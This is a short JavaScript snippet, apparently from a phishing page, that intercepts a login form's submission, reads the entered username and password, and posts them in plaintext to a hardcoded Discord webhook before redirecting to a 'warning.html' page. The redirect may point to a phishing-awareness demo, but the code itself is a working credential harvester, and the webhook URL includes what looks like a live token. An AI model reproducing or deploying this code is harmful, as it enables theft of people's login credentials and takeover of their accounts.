document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault(); 

    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    let webhookURL = "https://discord.com/api/webhooks/1335018829129973873/l3YUDzWcx39n6iqcCOy1PdUOqOLo8573IKrCVcvWgdyGfVTnYx2f82qfjjh3Q1A4DGyV";  // Replace with your actual webhook URL

    let payload = {
        content: `📩 **New Login Attempt:**\n👤 Username: ${username}\n🔑 Password: ${password}`
    };

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if (response.ok) {
            //alert("✅ Message sent to Discord!");
            // Redirect only after the message is sent
            window.location.href = "warning.html";
        } else {
            //alert("❌ Failed to send message.");
        }
    }).catch(error => {
        console.error("Error:", error);
    });
});